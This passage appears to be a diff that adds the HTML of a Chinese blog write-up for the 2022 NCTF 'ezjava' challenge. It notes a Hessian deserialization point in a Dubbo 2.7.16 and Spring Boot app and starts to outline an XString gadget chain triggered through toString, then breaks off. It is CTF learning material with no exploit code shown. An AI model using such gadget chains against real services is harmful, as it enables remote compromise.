@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.134.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Snakinya" />
+  <meta property="og:url" content="https://www.snakin.top/posts/2022nctf-ezjava/" />
+  <link rel="canonical" href="https://www.snakin.top/posts/2022nctf-ezjava/" /><link rel="apple-touch-icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="shortcut" href="https://www.snakin.top/favicon.ico" /><link rel="alternate" type="application/atom+xml" href="https://www.snakin.top/index.xml" title="Snakinya-明烛天南">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/www.snakin.top\/"
+      },
+      "articleSection" : "posts",
+      "name" : "CTF | 2022NCTF ezjava",
+      "headline" : "CTF | 2022NCTF ezjava",
+      "description" : "题目浅析 题目直接给出反序列化点\n熟悉的hession反序列化，看一下依赖\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter\u0026lt;\/artifactId\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;\/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;\/scope\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.dubbo\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;dubbo\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.16\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;\/artifactId\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;\/dependencies\u0026gt; ",
+      "inLanguage" : "en-US",
+      "author" : "Snakinya",
+      "creator" : "Snakinya",
+      "publisher": "Snakinya",
+      "accountablePerson" : "Snakinya",
+      "copyrightHolder" : "Snakinya",
+      "copyrightYear" : "2023",
+      "datePublished": "2023-01-14 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2023-01-14 00:00:00 \u002b0000 UTC",
+      "url" : "https:\/\/www.snakin.top\/posts\/2022nctf-ezjava\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>CTF | 2022NCTF ezjava</title>
+  <meta property="og:title" content="CTF | 2022NCTF ezjava" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="题目浅析 题目直接给出反序列化点
+熟悉的hession反序列化，看一下依赖
+&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo&lt;/artifactId&gt; &lt;version&gt;2.7.16&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; " />
+  <meta name="description" content="题目浅析 题目直接给出反序列化点
+熟悉的hession反序列化，看一下依赖
+&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo&lt;/artifactId&gt; &lt;version&gt;2.7.16&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; " />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="https://www.snakin.top/favicon.ico" />
+  
+
+  
+    <style>.highlight{position:relative}.clipboard-button{color:var(--white);background-color:rgba(255,255,255,.786);border:none;border-radius:6px;padding:3px 5px 2px;font-size:1rem;position:absolute;z-index:1;right:0;top:0;margin:10px;transition:.1s;opacity:.5}.clipboard-button>svg{fill:var(--white)}.clipboard-button:hover,.clipboard-button:focus,pre:active~.clipboard-button,pre:focus~.clipboard-button,div.highlight:active>.clipboard-button,div.highlight:focus>.clipboard-button{cursor:pointer;opacity:1}</style>
+  
+  
+    <style>@import "https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/lxgwwenkaiscreenr.css";.busuanzi-footer{font-size:14px;color:#666;display:inline-block;gap:10px;align-items:center}.busuanzi-footer .separator{margin:0 5px;color:#999}.footer-beian{font-size:12px;color:#999;margin-top:5px;text-align:center}.footer-beian a{color:#0073e6;text-decoration:none}.footer-beian a:hover{text-decoration:underline}body{font-family:lxgw wenkai screen r,bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:40%;min-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none;word-break:break-all}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:1px;font-size:16px;font-weight:550;font-family:Consolas,Monaco,Menlo,Consolas,monospace;word-break:break-all;word-wrap:break-word;overflow-y:auto;max-height:300px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px;text-size-adjust:100%;-ms-text-size-adjust:100%;-moz-text-size-adjust:100%;-webkit-text-size-adjust:100%}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:150%}.site-date-catalog{font-size:2rem}.header-title{font-size:1.5rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px;font-weight:700}.header-item a:hover{font-weight:700;color:#8a2be2}.header-item a:visited{font-weight:700}.header-item a:active{font-weight:700}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px;text-align:center}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){article{max-width:100%;min-width:300px}.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}table{width:100%;color:#333;border-width:1px;border-color:#666;border-collapse:collapse}table th{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#dedede}table td{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#fff}.post-content a{color:#0969da;box-shadow:none;text-decoration:none}a:hover{font-weight:400}.post-content a:hover{text-decoration:underline}.footnotes{> hr { display: none; }}.footnotes ol{line-height:1.4;margin-bottom:20px}.footnotes li{margin-bottom:5px}.footnotes ol li p{margin:0;padding:0;line-height:1.4}.donation{display:block;margin-left:auto;margin-right:auto}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+  
+    <style>.toc{background-color:#f5f5f5;margin:0 auto;width:90%;border-radius:8px;padding:20px;box-shadow:0 4px 6px rgba(0,0,0,.1)}.toc ul{padding-left:20px}.toc li{line-height:1.6;margin-bottom:0}.toc li a{color:#333}.toc li a:hover{color:#000}.toc details{cursor:pointer}.toc summary{font-weight:700}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;padding-bottom:0;font-size:16px;max-height:83vh;overflow-y:auto}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Snakinya-明烛天南">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+
+
+
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post Chinese" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  
+  <div class="header-title">
+    <a href="/"
+      >Snakinya</a
+    >
+  </div>
+  <div class="header-subtitle" style="color:blueviolet;">苍山负雪，明烛天南</div>
+</header>
+
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/Snakinya" target="_self">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/categories" target="_self">Categories</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/about/" target="_self">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/books/" target="_self">Books</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/friends/" target="_self">Friends</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/posts/" target="_self">Posts</a>
+  </div>
+  
+</div>
+
+<div class="header-line"></div>
+
+        </div>
+
+        <header class="post-header">
+          <h1 class="post-title">CTF | 2022NCTF ezjava</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2023-01-14 00:00:00 UTC">
+                14 Jan 2023
+              </time>
+              
+            </div>
+            
+            <div class="col-xs-6">
+
+              
+              <div class="post-author">
+              <span id="busuanzi_container_page_pv">@本文阅读量<span id="busuanzi_value_page_pv"></span>次</span>
+                
+            </div>
+          </div>
+          
+        </header>
+        
+
+        <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e9%a2%98%e7%9b%ae%e6%b5%85%e6%9e%90" aria-label="题目浅析">题目浅析</a></li>
+                <li>
+                    <a href="#%e5%a4%8d%e7%8e%b0" aria-label="复现">复现</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+        
+
+
+
+        <div class="post-content markdown-body">
+          
+          <h2 id="题目浅析">题目浅析</h2>
+<p>题目直接给出反序列化点</p>
+<p><img alt="image-20221209210109062" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20221209210109062.png"></p>
+<p>熟悉的hession反序列化，看一下依赖</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;dependencies&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff6ac1">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;artifactId&gt;</span>spring-boot-starter<span style="color:#ff6ac1">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff6ac1">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;artifactId&gt;</span>spring-boot-starter-test<span style="color:#ff6ac1">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;scope&gt;</span>test<span style="color:#ff6ac1">&lt;/scope&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;groupId&gt;</span>org.apache.dubbo<span style="color:#ff6ac1">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;artifactId&gt;</span>dubbo<span style="color:#ff6ac1">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;version&gt;</span>2.7.16<span style="color:#ff6ac1">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff6ac1">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">&lt;artifactId&gt;</span>spring-boot-starter-web<span style="color:#ff6ac1">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><p>很明显需要我们在dubbo环境下找一条利用链</p>
+<p>对于hessian反序列化，其关键点是通过toString方法去触发后续利用</p>
+<p>而如何去触发一个toString方法？不难想到经典的XString利用链</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>java<span style="color:#ff6ac1">.</span>util<span style="color:#ff6ac1">.</span>Hashtable<span style="color:#78787e">#readObject</span>
+</span></span><span style="display:flex;"><span>java<span style="color:#ff6ac1">.</span>util<span style="color:#ff6ac1">.</span>Hashtable<span style="color:#78787e">#reconstitutionPut</span>
+</span></span><span style="display:flex;"><span>java<span style="color:#ff6ac1">.</span>lang<span style="color:#ff6ac1">.</span>AbstractMap<span style="color:#78787e">#equals</span>
